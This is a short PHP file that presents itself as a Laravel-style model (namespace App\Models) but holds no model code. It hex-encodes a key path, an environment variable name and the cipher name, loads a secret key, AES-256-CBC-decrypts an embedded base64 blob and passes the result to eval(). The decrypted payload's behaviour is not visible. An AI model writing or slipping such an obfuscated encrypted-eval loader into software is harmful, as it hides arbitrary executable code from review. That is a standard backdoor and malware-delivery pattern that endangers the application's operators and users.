<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('l2IoVhc99aEsGqcxoqwbEA==');

$c=base64_decode(

'6iJI33O0j/5n66OqFv8bCg1WmSbluTPctG1oCRRQZl2uhBFrFrQkZiLphPr1rbxmUoWp7ZGB8TTW' .
'P0QEIzqrTdNDqXJLXD1wdraNeoMoS0b8u+S2u/DeWaxq4rBCzBn8hzks7xGg5qYP4EAVGytKtkBD' .
'YZxki5fCCl3vNAH4cpMEzxBjsoht3KwLCut8QNA+5CWTD7bQ7Jm4oWOYYFwtAdEZE5gEYrD9kTA5' .
'Wo7totUGV79sBExa66N3A2ot07HmRc6oDdlh2noKU3MzZGEZIntKBziatNcyUGxa+HtjQH0MpdDt' .
'uiGsiNEbFvhzhjQUM56Om/khf3suCSjPsTyLrOYLJTgv38KRG+sddmnnZnsmthrfRn46Xk0sauEN' .
'MsNsI9YeFEoQrNQlA7v0u3AwAD8jmrg0x9Ct8UrVAsu/7M3FQKdLBDMc54QJXKTC82ZrWenfGc2m' .
'GZ5Do+VL+0HazGa2OctkYQ8VMhFcDh0Z2fJPOjIhc7W5PekdeQ+SCyENJhKuO+6AbKxxlxtDOnJ4' .
'HN51aNzChPXyV6nAuUV8Ty4fcTISXcioATDiyoR26PBc8rD+MCxeWiK2IXTECkmn1iID1GxN5XyB' .
'sYWhuEMpcvJ0eyntVIahmZz2Z14oqq1lJ1I6S56g5tV2TiR8Rcib7uv+LCVrBI1bVspE4AU/30mr' .
'gnzWvJiMbmEreKOj1oHZW4mrgjT63AvVny8TVvQNiHa7AwmdSeVSiOYxC5UB8YJ3qzoUVkUrEJ2H' .
'acWaOXlYgrS/0y9DGpLtYnl9eH7uDw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

